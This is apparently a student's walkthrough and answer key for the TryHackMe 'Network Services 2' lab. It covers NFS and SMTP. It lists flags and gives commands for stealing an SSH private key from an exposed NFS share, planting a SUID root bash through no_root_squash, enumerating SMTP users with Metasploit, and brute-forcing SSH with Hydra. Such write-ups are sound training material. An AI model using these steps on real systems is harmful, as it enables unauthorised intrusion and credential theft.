Network Services 2
##################
:Author: David Boyd
:Date: 2020-11-17

[Task 3] Enumerating NFS
************************

enumeration
	a process which establishes an active connection to the target hosts to
	discover potential attack vectors in the system, and the same can be used
	for further exploitation of the system.

NSF-Common
	a package used in NFS interaction that include programs, such as: lock,
	statd, showmount, nfsstat, gssd, idmapd, and mount.nfs.

.. code-block:: Bash

	# Install NFS-Common pckg
	sudo apt install nfs-common -y

Mounting NFS Shares
===================

Your client's system needs a directory where all the content shared by the host
server in the export folder can be accessed.  You can create this folder
anywhere on your system.  Once you've created this mount point, you can use the
"mount" command to connect the NFS share to the mount point on your machine,
like this:

.. code-block:: Bash

	sudo mount -t nfs IP:share /tmp/mount/ -nolock

+----------+-------------------------------------------------------------+
| Tag      | Function                                                    |
+==========+=============================================================+
| mount    | execute the mount command                                   |
+----------+-------------------------------------------------------------+
| -t nfs   | type of device to mount, then specifying that it's NFS      |
+----------+-------------------------------------------------------------+
| IP:share | The IP Address of the NFS server, and the name of the share |
|          | we wish to mount                                            |
+----------+-------------------------------------------------------------+
| -noloock | Specifies not to use NLM locking                            |
+----------+-------------------------------------------------------------+

Questions
=========

Conduct a thorough port scan scan of your choosing, how many ports are open?
----------------------------------------------------------------------------
:Answer: 7

Which port contains the service we're looking to enumerate?
-----------------------------------------------------------
:Answer: 2049
:Note: 2049: UDP - NFS (Network File SYstem) (Official)

Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
---------------------------------------------------------------------------------------------------
:Answer: /home

Walkthrough
^^^^^^^^^^^
:showmount: show mount information for an NFS server
:showmount -e (or --exports): Show the NFS server's export list.

.. code-block:: Bash

	showmount -e $TM

What is the name of the folder inside?
--------------------------------------
:Answer: cappucino

Walkthrough
^^^^^^^^^^^
:WSL: OVPN needs to be initiated through WSL, not Windows.

Time to mount the share to our local machine!

First, use `mkdir /tmp/mount` to create a directory on your machine to mount
the share to. This is in the /tmp directory- so be aware that it will be
removed on restart.

Then, use the mount command we broke down earlier to mount the NFS share to
your local machine. Change directory to where you mounted the share-

.. code-block:: Bash

	# Mount the $TM's folder
	sudo mount -t nfs $TM:/home /tmp/mount/ -nolock

Have a look inside this directory, look at the files. Looks like we're inside a user's home directory...
--------------------------------------------------------------------------------------------------------
:Answer: [No answer needed]

Interesting! Let's do a bit of research now, have a look through the folders.  Which of these folders could contain keys that would give us remote access to the server?
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
:Answer: .ssh

Which of these keys is most useful to us?
-----------------------------------------
:Answer: id_rsa

Can we log into the machine using ssh -i <key-file> <username>@<ip>? (Y/N))
---------------------------------------------------------------------------
:Answer: Y

Walkthrough
^^^^^^^^^^^

Copy this file to a different location your local machine, and change the
permissions to "600" using "chmod 600 [file]".

Assuming we were right about what type of directory this is, we can pretty
easily work out the name of the user this key corresponds to.

.. code-block:: Bash

	mkdir /tmp/bleh && cd /tmp/bleh/
	cp /tmp/mount/cappucino/.ssh/id_rsa /tmp/bleh/id_rsa
	sudo chmod 600 id_rsa
	ssh -i id_rsa cappucino@$TM

[Task 4] Exploiting NFS
***********************

Introduction
============

root_squash
	a NFS shares feature that, when enabled, *prevents anyone connecting to the
	NFS share from having root access* to the NFS volume.  Thus, remote "root"
	users are assigned as "nfsnobody" users when connected.  If root_squash is
	turned off, then remote users can create SUID bit files.

SUID bit set
	file(s) can be run with the permissions of the file(s) owner/group.  --as a
	super-user, we can leverage SUID to get a shell with

Method
------
:files: bash shell executable

1. Upload files to the NFS share
2. Set the permissions of these files
3. Log in through ssh
4. Execute files

The Executable
--------------

Upload a shell that is th esame as the server's (known from nmap scan).

Method Mapped Out
-----------------

1. NFS Access
2. Gain low privilege shell
3. set SUID permissions through NFS (if misconfigured *root squash*)
4. login through SSH
5. execute SUID bit bash executable
6. Root access!

Questions
=========

First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.
-------------------------------------------------------------------------------------------------------------------------------------------------
:Answer: [No answer needed]

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
:Answer: [No answer needed]

What letter do we use to set the SUID bit set using chmod?
----------------------------------------------------------

Walkthrough
^^^^^^^^^^^

Now, we're going to add the SUID bit permission to the bash executable we just
copied to the share using "sudo chmod +[permission] bash".

What does the permission set look like? Make sure that it ends with -sr-x.
--------------------------------------------------------------------------
:Answer: rwsr-sr-x

Walkthrough
^^^^^^^^^^^
:Note: There may be alterations to the permissions.

Let's do a sanity check, let's check the permissions of the "bash" executable
using "ls -la bash".

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p".  The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
:Answer: [No answer needed]

Great! If all's gone well you should have a shell as root! What's the root flag?
--------------------------------------------------------------------------------
:Answer: THM{nfs_got_pwned}

Walkthrough
^^^^^^^^^^^

**Note:** In order to allow the NFS system to copy the file's permissions, you
must modify the permissions *afer copying file from localhost to mounted
location*.

This walkthrough covers all of **Task 4**.

.. code-block:: Bash

	# Download the server's bash version
	wget https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true
	-O bash

	# Copy from localhost to mounted NFS
	cp ./bash /tmp/mount/cappucino/bash

	# Change ownership
	sudo chown root /tmp/mount/cappucino/bash

	# Set SUID
	sudo chmod +s /tmp/mount/cappucino/bash

	# CTF
	cat /root/root.txt

[Task 5] Understanding SMTP
***************************

SMTP's 3 Basic Functions:

	- verifies who is sending emails through the SMTP server
	- sends the outgoing mail
	- if mail can't be delivered, SMTP server sends the msf back to the client

POP
	downloads an instance of the mailbox from the server

IMAP
	synchronizes the mailbox with the server

Questions
=========

What does SMTP stand for?
-------------------------
:Answer: Simple Mail Transwer Protocol

What does SMTP handle the sending of?
-------------------------------------
:Answer: emails

What is the first step in the SMTP process?
-------------------------------------------
:Answer: SMTP handshake

What is the default SMTP port?
------------------------------
:Answer: 25

Where does the SMTP server send the email if the recipient's server is not available?
-------------------------------------------------------------------------------------
:Answer: SMTP queue

On what server does the Email ultimately end up on?
---------------------------------------------------
:Answer: POP/IMAP

Can a Linux machine run an SMTP server? (Y/N)
---------------------------------------------
:Answer: Y

Can a Windows machine run an SMTP server? (Y/N)
-----------------------------------------------
:Answer: Y

[Task 6] Enumerating SMTP
*************************

Introduction
============

msf > smtp_version
	scans a range of IP addresses and determine the version of any mail servers
	it encounters.

msf > smtp_enum  | smtp-user-enum
	a module that enumerates SMTP usernames; feed it host(s) to scan and a
	wordlist of usernames to enumerate.

Reveal a list of valid users through:

	- manually: VRFY, EXPN (expand)
	- msf: stmp_enum

VRFY
	confirming the names of valid users

EXPN
	revealst he address of user's aliases and lists of e-mail (mailing lists)

Set up MSF > smtp_version

.. code-block:: Bash

	msfdb run
	search smtp_version
	use auxiliary/scanner/smtp/smtp_version

Questions
=========

What port is SMTP running on?
-----------------------------
:Answer: 25

First, lets run a port scan against the target machine, same as last time.

What command do we use to do this?
----------------------------------
:Answer: msfconsole
:Alternative: msfdb run/reinit

Okay, now we know what port we should be targeting, let's start up Metasploit.

Let's search for the module "smtp_version", what's it's full module name?
-------------------------------------------------------------------------
:Answer: auxiliary/scanner/smtp/smtp_version

If you would like some more help, or practice using, Metasploit, Darkstar has
an amazing room on Metasploit that you can check out here:

https://tryhackme.com/room/rpmetasploit

Great, now- select the module and list the options. How do we do this?
----------------------------------------------------------------------
:Answer: options

What is the option we need to set?
----------------------------------
:Answer: RHOSTS

Info
^^^^

Have a look through the options, does everything seem correct?

What's the system mail name?
----------------------------
:Answer: polosmtp.home

Info
^^^^

Set that to the correct value for your target machine. Then run the exploit.

What Mail Transfer Agent (MTA) is running the SMTP server?
-----------------------------------------------------------
:Answer: Postfix

Info
^^^^

This will require some external research.

Walkthrough
^^^^^^^^^^^
:URL1: https://en.wikipedia.org/wiki/Message_transfer_agent
:URL2: https://en.wikipedia.org/wiki/List_of_mail_server_software

`nmap -p 25 -sV $TM`


What's it's full module name?
-----------------------------
:Answer: auxiliary/scanner/smtp/smtp_enum

Info
^^^^

Good! We've now got a good amount of information on the target system to move
onto the next stage. Let's search for the module "smtp_enum",

What option do we need to set to the wordlist's path?
-----------------------------------------------------
:Answer: USER_FILE

Info
^^^^

We're going to be using the "top-usernames-shortlist.txt" wordlist from the
Usernames subsection of seclists (/usr/share/seclists/Usernames if you have it
installed).

Seclists is an amazing collection of wordlists. If you're running Kali or
Parrot you can install seclists with: "sudo apt install seclists"
Alternatively, you can download the repository from here.

Once we've set this option, what is the other essential paramater we need to set?
---------------------------------------------------------------------------------
:Answer: RHOSTS

Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!
---------------------------------------------------------------------------------------------------------------------------------------------------
:Answer: [No answer needed]

Okay! Now that's finished, what username is returned?
-----------------------------------------------------
:Answer: administrator

Walkthrough
^^^^^^^^^^^

.. code-block:: Bash

	# install SecLists
	sudo apt install seclists -y

	# set smtp_enum option USER_FILE to username list
	msf6 ...enum) > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
	run

[Task 7] Exploiting SMTP
************************
:tools: Hydra (online dictionary attack)
:Hydra syntax: hydra -t <threads> -l <username> -P <pass.txt> -vV $TM <protocol>

Questions
=========

What is the password of the user we found during our enumeration stage?
-----------------------------------------------------------------------
:Answer: alejandro

Walkthrough
^^^^^^^^^^^

`hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt $TM ssh -I -f
-vV`


Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
-------------------------------------------------------------------------------
:Answer: THM{who_knew_email_servers_were_c00l?}

Walkthrough
^^^^^^^^^^^

.. code-block:: Bash

	# SSH into SMTP server
	ssh administrator@$TM
	# CTF
	ls; cat smtp.txt

[Task 8] Understanding MySQL
****************************

